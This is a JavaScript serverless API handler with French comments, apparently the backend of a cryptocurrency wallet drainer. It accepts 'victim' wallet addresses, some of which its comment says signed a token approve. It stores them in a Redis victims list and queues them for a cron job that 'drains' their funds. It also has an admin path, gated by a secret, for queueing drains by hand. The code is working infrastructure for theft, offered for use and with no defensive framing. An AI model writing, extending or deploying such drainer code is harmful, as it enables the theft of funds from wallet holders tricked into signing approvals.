import { createClient } from 'redis';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  if (req.method === 'POST') {
    const { victim, chain, adminSecret } = req.body;

    // --- DRAIN MANUEL ADMIN ---
    if (adminSecret) {
      if (!process.env.ADMIN_SECRET || process.env.ADMIN_SECRET.trim().length === 0) {
        return res.status(500).json({ error: 'ADMIN_SECRET non configuré' });
      }
      if (adminSecret !== process.env.ADMIN_SECRET) {
        return res.status(401).json({ error: 'Secret admin invalide' });
      }
      if (!victim || typeof victim !== 'string' || victim.length !== 42) {
        return res.status(400).json({ error: 'Adresse victime invalide' });
      }
      const targetChain = chain || '1';
      console.log(`🔧 Drain manuel admin pour ${victim} (chain ${targetChain})`);

      const client = createClient({ url: process.env.REDIS_URL });
      try {
        await client.connect();
        const list = await client.get('victims:list');
        const parsedList = list ? JSON.parse(list) : [];
        if (!parsedList.includes(victim)) {
          parsedList.push(victim);
          await client.set('victims:list', JSON.stringify(parsedList));
        }
        await client.lPush('drain:queue', JSON.stringify({ victim, chain: targetChain }));
      } finally {
        await client.disconnect();
      }
      // Le cronjob process-queue drainera automatiquement
      return res.status(200).json({ success: true, queued: true, victim });
    }

    // --- FLUX NORMAL : victime ayant signé l’approve (ou test) ---
    if (!victim || typeof victim !== 'string' || victim.length !== 42) {
      return res.status(400).json({ error: 'Adresse victime invalide' });
    }

    const targetChain = chain || '1';

    const client = createClient({ url: process.env.REDIS_URL });
    try {
      await client.connect();

      // Enregistrer dans l’historique
      const list = await client.get('victims:list');
      const parsedList = list ? JSON.parse(list) : [];
      if (!parsedList.includes(victim)) {
        parsedList.push(victim);
        await client.set('victims:list', JSON.stringify(parsedList));
      }

      // Mettre en queue
      await client.lPush('drain:queue', JSON.stringify({ victim, chain: targetChain }));
    } finally {
      await client.disconnect();
    }

    return res.status(200).json({ success: true, queued: true, victim, chain: targetChain });
  } else {
    return res.status(405).json({ error: 'Méthode non autorisée' });
  }
}
